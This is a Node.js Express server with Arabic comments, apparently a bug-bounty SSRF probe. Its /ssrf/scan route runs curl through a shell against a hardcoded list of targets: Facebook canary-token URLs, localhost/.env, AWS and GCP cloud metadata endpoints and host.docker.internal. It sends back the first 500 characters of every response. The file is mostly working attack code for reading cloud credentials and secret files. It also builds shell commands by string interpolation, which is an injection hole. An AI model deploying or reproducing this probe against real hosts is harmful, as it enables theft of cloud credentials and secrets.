const express = require("express");
const { exec } = require("child_process");
const app = express();
const PORT = 10000;

// أهداف داخلية شائعة لاستغلال SSRF
const targets = [
  "https://www.internalfb.com/intern/bug-bounty/get-canary-token/c7b9aba96a3146ebb4160c6587979d37/",
  "https://www.internalfb.com/intern/bug-bounty/get-canary-token/a26ac8dd14b6455080e8c17efabc9918/",
  "hhttps://www.internalfb.com/intern/bug-bounty/get-canary-token/2e49cb8005f143c4af4baf45b35b7754/",
  "http://canarytokens.com/tags/terms/feedback/7isrljun6qtu0imnt1a0hlt74/index.html",
  "http://localhost/.env",
  "http://169.254.169.254/latest/meta-data/",
  "http://169.254.169.254/latest/user-data/",
  "http://metadata.google.internal/computeMetadata/v1/",
  "http://host.docker.internal/",
];

// دالة تفحص كل رابط
function testTarget(url, callback) {
  const cmd = `curl -s --max-time 5 "${url}"`;
  exec(cmd, (err, stdout) => {
    if (err || !stdout.trim()) {
      callback(null);
    } else {
      callback({ url, response: stdout.trim().slice(0, 500) }); // نطبع أول 500 حرف فقط
    }
  });
}

// مسار تنفيذ الفحص
app.get("/ssrf/scan", async (req, res) => {
  let found = [];

  let index = 0;

  function next() {
    if (index >= targets.length) {
      if (found.length === 0) {
        return res.send(`<h2>❌ لم يتم العثور على رد من أي هدف</h2>`);
      }
      return res.send(
        found
          .map((entry) => `<h3>🎯 ${entry.url}</h3><pre>${entry.response}</pre>`)
          .join("<hr>")
      );
    }

    const url = targets[index++];
    console.log(`📡 Trying: ${url}`);

    testTarget(url, (result) => {
      if (result) {
        console.log(`✅ SUCCESS: ${url}`);
        found.push(result);
      } else {
        console.log(`❌ FAILED: ${url}`);
      }
      next();
    });
  }

  next();
});

// تشغيل السيرفر
app.listen(PORT, () => {
  console.log(`🔥 Server running at http://localhost:${PORT}`);
});
